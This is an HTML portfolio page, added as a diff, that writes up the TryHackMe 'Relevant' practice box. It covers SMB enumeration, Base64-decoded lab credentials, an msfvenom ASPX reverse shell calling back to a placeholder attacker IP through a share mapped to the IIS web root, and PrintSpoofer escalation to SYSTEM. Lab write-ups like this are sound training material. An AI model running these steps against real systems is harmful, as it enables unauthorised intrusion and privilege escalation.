@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Relevant — Case File — Trent</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<nav>
+  <div class="wrap">
+    <div class="nav-brand">trent<span>@</span>secops</div>
+    <ul class="nav-links">
+      <li><a href="../index.html#capabilities">Capabilities</a></li>
+      <li><a href="../index.html#cases">Case Files</a></li>
+      <li><a href="../index.html#path">Certification Path</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="writeup-header">
+  <div class="wrap">
+    <a class="back-link" href="index.html">&larr; Back to all case files</a>
+    <div class="ticket-bar" style="margin-top:18px;">
+      <span class="ticket-id">CASE-05</span>
+      <span class="status-badge status-resolved">Resolved</span>
+      <span>SMB Exploitation / Windows Server / Privilege Escalation</span>
+    </div>
+    <h1>Relevant</h1>
+    <div class="writeup-meta-grid">
+      <span><strong>Room</strong> TryHackMe — Relevant</span>
+    </div>
+    <div class="case-tags">
+      <span class="tag">SMB</span>
+        <span class="tag">Windows Server</span>
+        <span class="tag">PrintSpoofer</span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+  <article class="writeup-body">
+<p><strong>Category:</strong> SMB Exploitation / Windows Server / Privilege Escalation
+<strong>Target:</strong> THM "Relevant" room
+<strong>Objective:</strong> Windows Server 2016 box — get user and root flags</p>
+<p><strong>Open Ports:</strong>
+- 80/tcp — Microsoft IIS httpd 10.0
+- 135/tcp — Microsoft Windows RPC
+- 139/tcp — netbios-ssn
+- 445/tcp — microsoft-ds (Windows Server 2016 Standard Evaluation, build 14393)
+- 3389/tcp — RDP
+- 49663/tcp, 49666/tcp, 49667/tcp — high dynamic RPC/HTTP ports</p>
+<hr />
+<h2>1. Initial Recon</h2>
+<p>Ran a full service scan:</p>
+<pre><code>nmap 10.65.133.232 -sV -sC
+</code></pre>
+<p>Notable findings:
+- IIS 10.0 default site on port 80
+- SMB with <code>message_signing: disabled</code> and <code>account_used: guest</code> in <code>smb-security-mode</code>, suggesting guest/anonymous SMB access might work
+- RDP open with NTLM info revealing hostname "Relevant" and Windows Server 2016 (build 14393)</p>
+<p>A full port sweep (<code>nmap -p- -T4</code>) later revealed three additional high ports not shown by default: <code>49663</code>, <code>49666</code>, <code>49667</code>. The latter two were generic Windows RPC endpoint mapper ports (dead ends). Port <code>49663</code> turned out to be a second IIS site instance — this became central to the exploitation path.</p>
+<h2>2. SMB Enumeration</h2>
+<p>Checked for anonymous/guest SMB share access:</p>
+<pre><code>smbclient -L //10.65.133.232/ -N
+</code></pre>
+<p>Found a share with an unusual name: <strong><code>nt4wrksv</code></strong>. Connecting to it anonymously revealed:</p>
+<pre><code>smbclient //10.65.133.232/nt4wrksv -N
+</code></pre>
+<pre><code>passwords.txt
+</code></pre>
+<h2>3. Decoding Credentials</h2>
+<p>Downloaded and read <code>passwords.txt</code>, which contained two Base64-encoded lines:</p>
+<pre><code>Qm9iIC0gIVBAJCRXMHJEITEyMw==
+QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+</code></pre>
+<p>Decoded both:</p>
+<pre><code>echo &quot;Qm9iIC0gIVBAJCRXMHJEITEyMw==&quot; | base64 -d
+echo &quot;QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk&quot; | base64 -d
+</code></pre>
+<p><strong>Result:</strong>
+- <strong>Bob</strong> — <code>!P@$$W0rD!123</code>
+- <strong>Bill</strong> — <code>Juw4nnaM4n420696969!$$$</code></p>
+<h2>4. Dead Ends (Documented for Reference)</h2>
+<p>Before finding the correct path, several reasonable avenues were tried and ruled out:
+- <strong>WebDAV on ports 80 and 49663</strong> — thoroughly checked via <code>OPTIONS</code>, <code>PROPFIND</code>, <code>cadaver</code>, <code>davtest</code>, and nmap's <code>http-webdav-scan</code>. No DAV support was found on either port; this was a false lead.
+- <strong><code>C$</code> / <code>ADMIN$</code> share access with Bob's credentials</strong> — visible in the share listing, but access was denied on connection, confirming Bob is <em>not</em> a local administrator.
+- <strong><code>impacket-psexec</code></strong> — confirmed <code>nt4wrksv</code> was writable and uploaded a service binary successfully, but failed at the <code>SVCManager</code> step, consistent with Bob lacking admin rights.
+- <strong>RDP with <code>xfreerdp</code></strong> — consistently failed with a TLS-layer "Connection reset by peer" error across multiple security-mode flags. This was ultimately an attackbox/FreeRDP compatibility quirk rather than a real path, and wasn't the intended route regardless.</p>
+<h2>5. The Actual Path: SMB Share Mapped to IIS Web Root</h2>
+<p>The key insight: <strong>the <code>nt4wrksv</code> SMB share is the same physical folder as a subdirectory of the IIS site running on port 49663</strong> (<code>C:\inetpub\wwwroot\nt4wrksv</code>). Anything uploaded via SMB to that share becomes immediately accessible — and executable, if it's a server-side script — over HTTP at:</p>
+<pre><code>http://10.65.133.232:49663/nt4wrksv/&lt;filename&gt;
+</code></pre>
+<p>This wasn't discoverable via directory brute-forcing on the web root alone, since <code>nt4wrksv</code> isn't a "guessable" wordlist entry — the connection had to be inferred from the fact that the SMB share and the web port shared the same underlying content.</p>
+<h2>6. Getting a Shell</h2>
+<p>Generated a Windows reverse shell payload in ASPX format:</p>
+<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;attacker_ip&gt; LPORT=4444 -f aspx -o shell.aspx
+</code></pre>
+<p>Uploaded it to the writable share using Bob's credentials:</p>
+<pre><code>smbclient //10.65.133.232/nt4wrksv -U 'Bob%!P@$$W0rD!123'
+put shell.aspx
+</code></pre>
+<p>Started a listener:</p>
+<pre><code>nc -lvnp 4444
+</code></pre>
+<p>Triggered the payload via the correct web path:</p>
+<pre><code>curl http://10.65.133.232:49663/nt4wrksv/shell.aspx
+</code></pre>
+<p>Caught a reverse shell running as the IIS application pool identity.</p>
+<h2>7. Finding the User Flag</h2>
+<p>Read the user flag directly from Bob's desktop:</p>
+<pre><code>type C:\Users\Bob\Desktop\user.txt
+</code></pre>
+<h2>8. Privilege Escalation</h2>
+<p>Checked current privileges:</p>
+<pre><code>whoami /priv
+</code></pre>
+<p>Result showed:</p>
+<pre><code>SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
+</code></pre>
+<p>This is a well-known misconfiguration — a service account with <code>SeImpersonatePrivilege</code> enabled can be abused via token impersonation exploits (like <strong>JuicyPotato</strong> or, more reliably here, <strong>PrintSpoofer</strong>) to escalate to <code>NT AUTHORITY\SYSTEM</code>.</p>
+<p><strong>Uploaded PrintSpoofer64.exe</strong> via the same writable SMB share:</p>
+<pre><code>smbclient //10.65.133.232/nt4wrksv -U 'Bob%!P@$$W0rD!123'
+put PrintSpoofer64.exe
+</code></pre>
+<p><strong>Executed it from the reverse shell:</strong></p>
+<pre><code>cd C:\inetpub\wwwroot\nt4wrksv
+PrintSpoofer64.exe -i -c cmd
+</code></pre>
+<p>This spawned a new <code>cmd.exe</code> process running as <strong>NT AUTHORITY\SYSTEM</strong>.</p>
+<h2>9. Root Flag</h2>
+<p>Confirmed elevated access and retrieved the final flag:</p>
+<pre><code>whoami
+type C:\Users\Administrator\Desktop\root.txt
+</code></pre>
+<hr />
+<h2>Key Takeaways</h2>
+<ul>
+<li><strong>An oddly-named SMB share found via guest/anonymous access is often more than a file drop point</strong> — check whether it corresponds to a web-accessible directory, especially on Windows/IIS boxes with multiple site bindings on non-standard ports.</li>
+<li><strong>Don't assume WebDAV just because a port pattern looks familiar</strong> — always confirm with direct method probing (<code>OPTIONS</code>, <code>PROPFIND</code>) rather than assuming based on port number or service fingerprint alone; ruling this out took a significant amount of time here.</li>
+<li><strong>Valid credentials don't imply admin rights</strong> — being able to <em>list</em> shares like <code>C$</code>/<code>ADMIN$</code> is different from being able to <em>connect</em> to them. Always verify actual access before assuming <code>psexec</code>-style tools will work.</li>
+<li><strong><code>SeImpersonatePrivilege</code> enabled on a low-priv service account is a direct path to SYSTEM</strong> — tools like PrintSpoofer or JuicyPotato exploit this token impersonation flaw reliably on unpatched/misconfigured Windows hosts.</li>
+<li><strong>A writable SMB share tied to a web root is a full read/write/execute primitive</strong> — upload, trigger via HTTP, and you have code execution without needing any other vulnerability.</li>
+</ul>
+  </article>
+</div>
+
+<footer>
+  <div class="wrap">
+    <a class="back-link" href="index.html">&larr; Back to all case files</a>
+  </div>
+</footer>
+
+</body>
+</html>
